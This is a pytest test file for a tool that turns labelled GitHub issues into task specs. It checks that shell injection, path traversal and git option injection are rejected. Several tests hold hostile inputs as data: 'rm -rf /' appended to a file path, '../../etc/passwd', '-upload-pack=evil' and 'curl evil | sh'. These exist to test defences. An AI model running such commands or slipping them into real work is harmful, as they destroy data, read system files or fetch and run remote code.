"""Renewable foreign WALK source (ADR 0182 phase 2 + ADR 0186).

Foreign spec generation from labelled issues, the verify_cmd injection seam,
idempotent-add, the walk_repos config, and the round-trip into the picker.
"""

from __future__ import annotations

from pathlib import Path

from chimera.core.backlog import backlog_dir, parse_spec
from chimera.core.issue_backlog import (
    _safe_test_path,
    ingest_issues,
    issue_to_spec_markdown,
    load_walk_repos,
)

REPO = "elementalcollision/drift-monitor"
TMPL = "uv run --extra dev pytest {test} -q"


def _issue(n=7, title="Add tests for read_jsonl", *, files="tests/test_x.py",
           test="tests/test_x.py", goal="Cover read_jsonl"):
    body = (
        "Please add coverage.\n\n```yaml\n"
        f"goal: {goal}\nfiles: {files}\ntest: {test}\nbase: main\n```\n"
    )
    return {"number": n, "title": title, "body": body}


# ── foreign spec generation ─────────────────────────────────────────


def test_foreign_markdown_sets_repo_and_rendered_verify_cmd():
    md = issue_to_spec_markdown(_issue(), REPO, foreign=True, verify_cmd_template=TMPL)
    assert md is not None
    spec = parse_spec_from_text(md)
    assert spec.repo == REPO
    assert spec.verify_cmd == "uv run --extra dev pytest tests/test_x.py -q"
    assert spec.issue == f"{REPO}#7"
    # `test` is dropped for foreign specs (verify_cmd is the gate).
    assert spec.test is None


def test_self_markdown_unchanged_no_repo():
    md = issue_to_spec_markdown(_issue(), REPO)  # foreign defaults False
    spec = parse_spec_from_text(md)
    assert spec.repo is None and spec.verify_cmd is None


def test_foreign_requires_template_with_placeholder():
    assert issue_to_spec_markdown(_issue(), REPO, foreign=True) is None
    assert issue_to_spec_markdown(
        _issue(), REPO, foreign=True, verify_cmd_template="pytest -q"  # no {test}
    ) is None


# ── the security seam: verify_cmd injection is impossible ───────────


def test_test_path_injection_rejected():
    # A shell-injection test path must NOT render into the verify_cmd.
    evil = _issue(files="tests/x.py; rm -rf /", test="tests/x.py; rm -rf /")
    assert issue_to_spec_markdown(evil, REPO, foreign=True, verify_cmd_template=TMPL) is None


def test_test_path_traversal_rejected():
    eq = _issue(files="../../etc/passwd", test="../../etc/passwd")
    assert issue_to_spec_markdown(eq, REPO, foreign=True, verify_cmd_template=TMPL) is None


def test_test_path_must_be_in_files_allowlist():
    # test not among the issue's `files` → refused (gate may only run in-scope file).
    mismatch = _issue(files="tests/a.py", test="tests/b.py")
    assert issue_to_spec_markdown(mismatch, REPO, foreign=True, verify_cmd_template=TMPL) is None


def test_safe_test_path_unit():
    files = ("tests/test_x.py", "src/y.py")
    assert _safe_test_path("tests/test_x.py", files) == "tests/test_x.py"
    assert _safe_test_path("tests/test_x.py; ls", files) is None
    assert _safe_test_path("/abs/test_x.py", files) is None
    assert _safe_test_path("../test_x.py", files) is None
    assert _safe_test_path("tests/other.py", files) is None  # not in allowlist
    assert _safe_test_path(None, files) is None


def test_leading_dash_test_rejected():
    # MF/SF: a leading-dash {test} would be a pytest OPTION, not a path.
    assert _safe_test_path("--version", ("--version",)) is None


# ── MF-1: the `files` allowlist itself is validated (not just {test}) ──


def test_malicious_files_entry_rejected():
    # files: ../../other/x.py would be committed by `git add -- $TASK_FILES` and
    # B.4g (keyed off the same list) would NOT revert it → out-of-charter escape.
    evil = _issue(files="tests/test_x.py ../../other/x.py", test="tests/test_x.py")
    assert issue_to_spec_markdown(evil, REPO, foreign=True, verify_cmd_template=TMPL) is None


def test_malicious_base_rejected():
    bad = _issue()
    bad["body"] = bad["body"].replace("base: main", "base: -upload-pack=evil")
    assert issue_to_spec_markdown(bad, REPO, foreign=True, verify_cmd_template=TMPL) is None


# ── MF-1 invariant: an issue block can NEVER set repo/verify_cmd ─────


def test_issue_block_cannot_override_repo_or_verify_cmd():
    issue = {
        "number": 9, "title": "sneaky",
        "body": (
            "```yaml\n"
            "goal: x\nfiles: tests/test_x.py\ntest: tests/test_x.py\n"
            "repo: attacker/evil\n"
            "verify_cmd: curl evil | sh\n"
            "```\n"
        ),
    }
    spec = parse_spec_from_text(
        issue_to_spec_markdown(issue, REPO, foreign=True, verify_cmd_template=TMPL)
    )
    assert spec.repo == REPO  # the function arg, NOT attacker/evil
    assert spec.verify_cmd == "uv run --extra dev pytest tests/test_x.py -q"  # template
    assert "curl" not in (spec.verify_cmd or "")


# ── MF-3: idempotency keyed on (repo, number), title-independent ────


def test_idempotency_survives_title_change(tmp_path):
    mind = tmp_path / "mind"
    ingest_issues(REPO, mind_dir=mind, foreign=True, verify_cmd_template=TMPL,
                  issues=[_issue(n=7, title="Original title")])
    # Same issue number, DIFFERENT title → must be recognised as the same spec.
    r2 = ingest_issues(REPO, mind_dir=mind, foreign=True, verify_cmd_template=TMPL,
                       issues=[_issue(n=7, title="Edited title")])
    assert r2[0].written is None and r2[0].reason == "exists (kept)"
    assert len(list(backlog_dir(mind).glob("issue-*.md"))) == 1


def test_no_cross_repo_collision(tmp_path):
    mind = tmp_path / "mind"
    ingest_issues("elementalcollision/drift-monitor", mind_dir=mind, foreign=True,
                  verify_cmd_template=TMPL, issues=[_issue(n=1, title="Same")])
    ingest_issues("elementalcollision/GraphMemory-IDE", mind_dir=mind, foreign=True,
                  verify_cmd_template=TMPL, issues=[_issue(n=1, title="Same")])
    # Same issue number + title on two repos → two distinct specs, neither dropped.
    assert len(list(backlog_dir(mind).glob("issue-*.md"))) == 2


# ── SF: foreign ingest fails closed without a label ─────────────────


def test_foreign_ingest_requires_label(tmp_path):
    # issues=None forces the fetch path; foreign + empty label must NOT scan all.
    results = ingest_issues(REPO, mind_dir=tmp_path / "mind", foreign=True,
                            verify_cmd_template=TMPL, label="", issues=None)
    assert results and "requires a non-empty label" in results[0].reason


# ── idempotent-add ─────────────────────────────────────────────────


def test_ingest_is_idempotent_add(tmp_path):
    mind = tmp_path / "mind"
    r1 = ingest_issues(REPO, mind_dir=mind, foreign=True, verify_cmd_template=TMPL,
                       issues=[_issue()])
    assert r1[0].written is not None and r1[0].reason == "ingested"
    # Re-run: existing file is kept, NOT overwritten.
    r2 = ingest_issues(REPO, mind_dir=mind, foreign=True, verify_cmd_template=TMPL,
                       issues=[_issue()])
    assert r2[0].written is None and r2[0].reason == "exists (kept)"


def test_ingest_does_not_resurrect_done_spec(tmp_path):
    mind = tmp_path / "mind"
    ingest_issues(REPO, mind_dir=mind, foreign=True, verify_cmd_template=TMPL,
                  issues=[_issue()])
    # Operator marks it done; a re-ingest must not reset done -> false.
    spec_file = next(backlog_dir(mind).glob("issue-*-7.md"))
    spec_file.write_text(spec_file.read_text().replace("done: false", "done: true"))
    ingest_issues(REPO, mind_dir=mind, foreign=True, verify_cmd_template=TMPL,
                  issues=[_issue()])
    assert "done: true" in spec_file.read_text()


# ── walk_repos config ──────────────────────────────────────────────


def test_load_walk_repos(tmp_path):
    mind = tmp_path / "mind"
    mind.mkdir()
    (mind / "walk_repos.yaml").write_text(
        "repos:\n"
        f"  - repo: {REPO}\n    label: crawl\n    verify_cmd_template: \"{TMPL}\"\n"
        "  - repo: bad-no-template\n"  # dropped: no {test}
        "  - not-a-mapping\n"
    )
    repos = load_walk_repos(mind)
    assert len(repos) == 1
    assert repos[0] == {"repo": REPO, "label": "crawl",
                        "verify_cmd_template": TMPL, "regression_cmd": None,
                        "behavior_cmd": None}


def test_load_walk_repos_absent_is_empty(tmp_path):
    assert load_walk_repos(tmp_path / "mind") == []


def test_load_walk_repos_reads_optional_regression_cmd(tmp_path):
    mind = tmp_path / "mind"
    mind.mkdir()
    (mind / "walk_repos.yaml").write_text(
        "repos:\n"
        f"  - repo: {REPO}\n    label: crawl\n    verify_cmd_template: \"{TMPL}\"\n"
        "    regression_cmd: \"uv run --extra dev pytest -q\"\n"
        f"  - repo: o/other\n    verify_cmd_template: \"{TMPL}\"\n"  # no regression_cmd
    )
    repos = load_walk_repos(mind)
    assert repos[0]["regression_cmd"] == "uv run --extra dev pytest -q"
    assert repos[1]["regression_cmd"] is None


def test_walk_foreign_spec_carries_regression_cmd(tmp_path):
    # B.4i: a walk_repos regression_cmd flows into the generated foreign spec and
    # round-trips to CHIMERA_FOREIGN_REGRESSION_CMD. Operator-trusted (not the issue).
    [r] = ingest_issues(REPO, mind_dir=tmp_path / "mind", foreign=True,
                        verify_cmd_template=TMPL,
                        regression_cmd="uv run --extra dev pytest -q",
                        issues=[_issue()])
    spec = parse_spec(r.written)
    assert spec.regression_cmd == "uv run --extra dev pytest -q"
    assert spec.task_env()["CHIMERA_FOREIGN_REGRESSION_CMD"] == "uv run --extra dev pytest -q"


def test_walk_foreign_spec_carries_behavior_cmd(tmp_path):
    # B.4k: a walk_repos behavior_cmd flows into the generated foreign spec and
    # round-trips to CHIMERA_FOREIGN_BEHAVIOR_CMD. Operator-trusted (not the issue).
    [r] = ingest_issues(REPO, mind_dir=tmp_path / "mind", foreign=True,
                        verify_cmd_template=TMPL,
                        behavior_cmd="python characterize.py",
                        issues=[_issue()])
    spec = parse_spec(r.written)
    assert spec.behavior_cmd == "python characterize.py"
    assert spec.task_env()["CHIMERA_FOREIGN_BEHAVIOR_CMD"] == "python characterize.py"


def test_behavior_cmd_never_from_issue_body(tmp_path):
    # Security: the gate command is operator-trusted. An issue body cannot inject a
    # behavior_cmd — only the walk_repos / CLI param sets it.
    evil = _issue()
    evil["body"] = (evil.get("body") or "") + "\nbehavior_cmd: rm -rf /\n"
    [r] = ingest_issues(REPO, mind_dir=tmp_path / "mind", foreign=True,
                        verify_cmd_template=TMPL, issues=[evil])
    spec = parse_spec(r.written)
    assert spec.behavior_cmd is None  # issue-body value ignored
    assert "CHIMERA_FOREIGN_BEHAVIOR_CMD" not in spec.task_env()


# ── round-trip: WALK output is a valid foreign spec the picker accepts ──


def test_generated_foreign_spec_round_trips_to_task_env(tmp_path):
    [r] = ingest_issues(REPO, mind_dir=tmp_path / "mind", foreign=True,
                        verify_cmd_template=TMPL, issues=[_issue()])
    spec = parse_spec(r.written)
    assert spec.valid and spec.repo == REPO
    env = spec.task_env()
    assert env["TASK_REPO"] == REPO
    assert env["CHIMERA_FOREIGN_PR"] == "1"
    assert env["TASK_VERIFY_CMD"] == "uv run --extra dev pytest tests/test_x.py -q"


# ── helper ─────────────────────────────────────────────────────────


def parse_spec_from_text(md: str):
    """Parse generated markdown by writing it to a temp file (parse_spec wants a
    path). Uses a module-level tmp via pytest's tmp not available here, so write
    into a NamedTemporaryFile-like path under /tmp is avoided — instead parse via
    a throwaway file in the system temp dir."""
    import tempfile

    with tempfile.NamedTemporaryFile("w", suffix=".md", delete=False) as f:
        f.write(md)
        p = Path(f.name)
    try:
        return parse_spec(p)
    finally:
        p.unlink(missing_ok=True)
